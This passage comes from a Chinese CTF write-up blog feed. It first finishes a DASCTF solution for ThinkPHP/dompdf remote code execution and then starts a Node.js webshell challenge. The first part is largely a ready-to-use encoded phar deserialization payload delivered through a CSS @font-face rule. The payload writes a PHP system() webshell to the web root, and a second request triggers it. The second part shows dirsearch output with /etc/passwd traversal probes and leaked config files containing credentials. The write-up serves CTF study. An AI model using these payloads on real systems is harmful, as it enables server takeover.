k6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);</span><br><span class="line">        font-weight:&#x27;normal&#x27;;</span><br><span class="line">        font-style:&#x27;normal&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 2 NOT ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    @font-face &#123;</span><br><span class="line">        font-family:&#x27;exploit&#x27;;</span><br><span class="line">        src:url(&#x27;phar:///var/www/html/vendor/dompdf/dompdf/lib/fonts/exploit_normal_da94a27b825aeca64e86b19a3972972d.ttf##&#x27;);</span><br><span class="line">        font-weight:&#x27;normal&#x27;;</span><br><span class="line">        font-style:&#x27;normal&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>将====== REQUEST 1 ENCODED =======先写入phar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>这里传content是因为审计源码的时候发现</p><p><img src="../images/image-20230426203507788.png" alt="image-20230426203507788"></p><p><img src="../images/image-20230426203522154.png" alt="image-20230426203522154"></p><p><img src="../images/image-20230426203609835.png" alt="image-20230426203609835"></p><p>知道这些以后，就可以去尝试post参数了</p><p><img src="../images/image-20230426203735353.png" alt="image-20230426203735353"></p><p>然后接着post第二个参数</p><p>触发phar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_da94a27b825aeca64e86b19a3972972d.ttf%23%23&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>然后直接访问1.php?0=ls就行了</p><p>参考文章 <a href="https://blog.csdn.net/mochu7777777/article/details/130309288?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168251168616800186547875%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168251168616800186547875&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-130309288-null-null.142^v86^control_2,239^v2^insert_chatgpt&amp;utm_term=pdf_converter_revenge&amp;spm=1018.2226.3001.4187">think PHP pdf rce</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> DASCTF WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1 id="DAS4-你听说过-js-的-webshell-吗的解题思路"><a href="#DAS4-你听说过-js-的-webshell-吗的解题思路" class="headerlink" title="DAS4-你听说过 js 的 webshell 吗的解题思路"></a>DAS4-你听说过 js 的 webshell 吗的解题思路</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><div class="table-container"><table><thead><tr><th>题目名</th><th>类型</th><th>难度</th></tr></thead><tbody><tr><td>DAS4-你听说过 js 的 webshell 吗</td><td>WEB</td><td>困难</td></tr></tbody></table></div><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><ul><li>DASCTF{test_flag}</li></ul><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>代码审计 nodejs</li><li>命令执行</li><li>nodejs 源代码泄漏</li><li>coding 其他 git 托管凭据泄漏</li></ol><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>打开网页</p><p><img src="https://c.img.dasctf.com/images/2023315/1678854079283-9b8e55a1-6827-42f8-9b80-4041b8bfdffa.png" alt="截屏2022-12-03 23.22.05"></p><p>直接打开 f12 发现 api 与注释</p><p><img src="https://c.img.dasctf.com/images/2023315/1678854085904-9310bb97-3f6a-4a2a-9a65-dd99779867a7.png" alt="截屏2022-12-03 23.22.45"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>这里其实想说的是扫描该网站 看看有没有发现</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://127.0.0.1 <span class="comment"># 这里不需要引入任何字典 泄漏的文件相当常见</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2.8</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11458</span><br><span class="line"></span><br><span class="line">Output File: /tmp/reports/</span><br><span class="line"></span><br><span class="line">Target: http://127.0.0.1/</span><br><span class="line"></span><br><span class="line">[23:23:56] Starting:</span><br><span class="line">[23:23:56] 403 -    9B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">[23:23:56] 403 -    9B  - /%2e%2e//google.com</span><br><span class="line">[23:23:58] 400 -   14B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[23:24:00] 200 -  679B  - /app.js</span><br><span class="line">[23:24:01] 403 -    9B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">[23:24:02] 200 -  439B  - /config.js</span><br><span class="line">[23:24:03] 200 -  170B  - /Dockerfile</span><br><span class="line">[23:24:07] 200 -  627B  - /package.json</span><br><span class="line">[23:24:07] 200 -   29KB - /package-lock.json</span><br><span class="line">[23:24:08] 200 -    9B  - /Readme.md</span><br><span class="line">[23:24:08] 200 -    9B  - /README.md</span><br><span class="line">[23:24:08] 200 -    9B  - /README.MD</span><br><span class="line">[23:24:08] 200 -    9B  - /ReadMe.md</span><br><span class="line">[23:24:08] 200 -    9B  - /readme.md</span><br><span class="line">[23:24:12] 200 -    6KB - /views</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><h3 id="入口点发现"><a href="#入口点发现" class="headerlink" title="入口点发现"></a>入口点发现</h3><p>发现存在相关的 js web 文件 尝试查看是否有其他泄漏。</p><ul><li><p>app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span>        = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyparser = <span class="built_in">require</span>(<span class="string">&#x27;koa-bodyparser&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span>     = <span class="built_in">require</span>(<span class="string">&#x27;koa-static&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> cors       = <span class="built_in">require</span>(<span class="string">&#x27;./cors&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> template   = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/template&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> route      = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/route&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> api        = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/api&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> listen     = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/listen&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> production = process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app        = <span class="keyword">new</span> <span class="title class_">Koa</span>()</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">static</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">template</span>(<span class="string">&#x27;views&#x27;</span>, &#123;</span><br><span class="line">        <span class="comment">// noCache: !production,</span></span><br><span class="line">        <span class="comment">// watch  : !production</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyparser)</span><br><span class="line">    .<span class="title function_">use</span>(cors)</span><br><span class="line">    .<span class="title function_">use</span>(route)</span><br><span class="line">    .<span class="title function_">use</span>(api)</span><br><span class="line"></span><br><span class="line"><span class="title function_">listen</span>(app)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>package.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;updater&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt; v0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;app.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;axios&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.21.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.13.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-bodyparser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.3.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-router&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^9.1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-sslify&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.0.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-static&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa2-cors&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0.6&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;nunjucks&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.2.2&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pm2 start ecosystem.config.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;prod&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pm2 start ecosystem.config.js --env production&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Readme</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># updater</span><br></pre></td></tr></table></figure></li><li><p>config.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = &#123;</span><br><span class="line">    <span class="attr">server</span>: &#123;</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;test.example.com&#x27;</span>,</span><br><span class="line">        <span class="attr">pact</span>: <span class="string">&#x27;https&#x27;</span>,</span><br><span class="line">        <span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="string">&#x27;443&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">coding</span>: &#123;</span><br><span class="line">        <span class="attr">username</span>: <span class="string">&#x27;test@test.com&#x27;</span>,</span><br><span class="line">        <span class="attr">password</span>: <span class="string">&#x27;IAmTheCodeMaster&#x27;</span>,</span><br><span class="line">        <span class="attr">apiKey</span>: <span class="string">&#x27;flag&#123;This is fake flag&#125;:-)&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;development&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable constant_">CONFIG</span>.<span class="property">server</span>.<span class="property">pact</span> = <span class="string">&#x27;http&#x27;</span>,</span><br><span class="line">    <span class="variable constant_">CONFIG</span>.<span class="property">server</span>.<span class="property">port</span> = <span class="string">&#x27;80&#x27;</span></span><br><span 